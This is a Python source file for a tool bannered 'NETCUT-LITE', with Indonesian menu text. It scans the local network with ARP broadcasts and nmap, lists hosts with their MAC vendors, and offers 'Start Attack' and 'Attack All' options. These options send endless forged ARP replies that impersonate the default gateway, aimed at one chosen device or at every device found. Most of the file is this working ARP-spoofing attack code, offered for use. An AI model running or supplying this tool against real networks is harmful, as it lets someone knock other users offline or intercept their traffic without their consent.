import scapy.all as scapy
from mac_vendor_lookup import MacLookup
import os
import sys
import time
import netifaces
import nmap

data_array = []
data_array1 = []
def logo():
    print(
    "\033[32m███╗   ██╗███████╗████████╗ ██████╗██╗   ██╗████████╗          ██╗     ██╗████████╗███████╗"+"\n"+
    "████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║   ██║╚══██╔══╝          ██║     ██║╚══██╔══╝██╔════╝"+"\n"+
    "██╔██╗ ██║█████╗     ██║   ██║     ██║   ██║   ██║       █████╗██║     ██║   ██║   █████╗  "+"\n"+
    "██║╚██╗██║██╔══╝     ██║   ██║     ██║   ██║   ██║       ╚════╝██║     ██║   ██║   ██╔══╝  "+"\n"+
    "██║ ╚████║███████╗   ██║   ╚██████╗╚██████╔╝   ██║             ███████╗██║   ██║   ███████╗"+"\n"+
    "╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝    ╚═╝             ╚══════╝╚═╝   ╚═╝   ╚══════╝\033[0m");
    print(f"\033[32mDefault Gateway\t:\033[0m \033[31m{default_gateway}\t\033[32mIP\t:\033[0m \033[31m{master_ip}\n\033[32mSUBNET MASK\t:\033[0m \033[31m{subnet_mask}\t\033[32mIPV4\t: \033[31m{ipv4}\033[0m")

def ipdata():
    arr = [
    '255.255.255.0','/24',
    '255.255.255.128','/25',
    '255.255.255.192','/26',
    '255.255.255.224','/27',
    '255.255.255.240','/28',
    '255.255.255.248','/29',
    '255.255.255.252','/30',
    '255.255.0.0','/16',
    '255.255.128.0','/17',
    '255.255.192.0','/18',
    '255.255.224.0','/19',
    '255.255.240.0','/20',
    '255.255.248.0','/21',
    '255.255.252.0','/22',
    '255.255.254.0','/23',
    '255.0.0.0','/8',
    '255.128.0.0','/9',
    '255.192.0.0','/10',
    '255.224.0.0','/11',
    '255.240.0.0','/12',
    '255.248.0.0','/13',
    '255.252.0.0','/14',
    '255.254.0.0','/15',
    ]

    gws = netifaces.gateways()
    ifaces = netifaces.interfaces()
    global default_gateway
    global subnet_mask
    default_gateway = gws['default'][netifaces.AF_INET][0]

    for interface in ifaces:
        if netifaces.AF_INET in netifaces.ifaddresses(interface):
            subnet_mask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
            break

    try:
        index = arr.index(subnet_mask)
        global master_ip
        master_ip = str(default_gateway) + str(arr[index+1])
    except ValueError:
        print("No Subnet Mask Was Found")

def Wireless():
    netifaces.gateways()
    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    global ipv4
    ipv4 = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']

def get_vendor(mac):
    try:
        vendor = MacLookup().lookup(mac)
    except:
        vendor = "unknown"
    return vendor

def scan(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    client_list = []

    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc, "vendor": get_vendor(element[1].hwsrc)}
        client_list.append(client_dict)

    return client_list


def print_result(scan_list):
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print("IP\t\t\tMAC\t\t\t\tVendor\n--------------------------------------------------------------------------\n")
    data = ""
    data2 = ""
    for client in scan_list:
        data += " " + client["ip"] + " " + client["mac"]
        global data_array
        data_array = data.strip().split(" ")
    
    i = 0
    for clients in scan_list:
        i += 1
        print( str(i) +". " + clients["ip"] + "\t\t" + clients["mac"] + "\t\t" + clients["vendor"])
        data2 += str(i) +". " + clients["ip"] + "\t\t" + clients["mac"] + "\t\t" + clients["vendor"] +" \n"
        global sv_data2
        sv_data2 = data2.strip().split("\n")
    
sv_data2 = []
sv_data3 = []
def print_data():
    master_data = sv_data2
    if len(master_data) == 0:
        master_data = sv_data3

    if len(master_data) == 0:
        print("\033[31mScan Wifi Dahulu\033[0m")
        time.sleep(1)
        start()
    
    
    try:
        print("IP\t\t\tMAC\t\t\t\tVendor\n--------------------------------------------------------------------------\n")
        for data in master_data:
            print(data)
    except:
        print("\033[31mScan Wifi Dahulu\033[0m")
        time.sleep(1)
        start()
            

def switch_case(case_value):
    switch = {
        1: lambda: print_result(scan(master_ip)),
        2: lambda: case_1(),
        3: lambda: case_2(),
        4: lambda: case_3(),
        5: lambda: sys.exit(0),
    }
    switch.get(case_value, lambda: print("Invalid case"))()

def case_1():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print("IP\t\t\tMAC\t\t\t\tVendor\n--------------------------------------------------------------------------\n")
    nm = nmap.PortScanner()
    nm.scan(master_ip, arguments='-sn')
    data = ""
    i = 0
    
    data2 = ""
    data1 = ""
    for host in nm.all_hosts():
        mac = nm[host].get('addresses').get('mac', 'Tidak diketahui')
        if mac != 'Tidak diketahui':
            i += 1
            data1 += f"{host} {mac} "
            print(f"{i}. {host}\t\t{mac}\t\t{get_vendor(mac)}")
            data2 += f"{i}. {host}\t\t{mac}\t\t{get_vendor(mac)}\n"
            global data_array1
            data_array1 = data1.split(" ")
            global sv_data3
            sv_data3 = data2.strip().split("\n")
        
    a = len(data_array1)
    data_array1.pop(a-1)

def case_2():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print_data()
    print("\n\033[32mPilih Nomer yang akan di Attack / 999 (Cancel)\033[0m")
    line = input("\033[31mpilih No: : \033[0m")
    line = int(line)

    if line == 999:
        start()
    else:
        line = line + (line-2)

    data = data_array
    if len(data_array) == 0:
        data = data_array1
    

    packet = scapy.ARP(op=2, pdst=data[line], hwdst=data[line+1], psrc=default_gateway)
    while True:
        try:
            print(data[line])
            scapy.send(packet)
        except KeyboardInterrupt:
            start()

def case_3():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    b = 0
    c = 0

    data = data_array
    if len(data) == 0:
        data = data_array1
    
    try:
        value = ipv4
        if value in data:
            index = data.index(value)
            d = index
            data_array.pop(index)
            data_array.pop(d)
            print(index)

    except:
        print("{} tidak ditemukan",ipv4)
    
    while True:
        try:
            for i in range(len(data)):
                b += 1
                if b % 2 == 0:
                    c += 1
                    #print(data_array[i-1],data_array[i])
                    packet = scapy.ARP(op=2, pdst=data[i-1], hwdst=data[i], psrc=default_gateway)
                    send = scapy.send(packet)
                    print(f"{c} 💀 {send}")
        except KeyboardInterrupt:
            start()

def start():
    os.system('cls' if os.name == 'nt' else 'clear')
    ipdata()
    Wireless()
    logo()
    while True:
        print(
            "\n\033[31mPilih Opsi :\033[0m\n"
            "  1. Scan Wifi \n"
            "  2. Scan Wifi (Nmap)      Take a litle bit longger\n"
            "  3. Start Attack\n"
            "  4. Attack All\n"
            "  5. Exit"
            )
        pilih = input("\033[31mPilih : \033[0m")
        switch_case(int(pilih))


if __name__=="__main__":
    start()


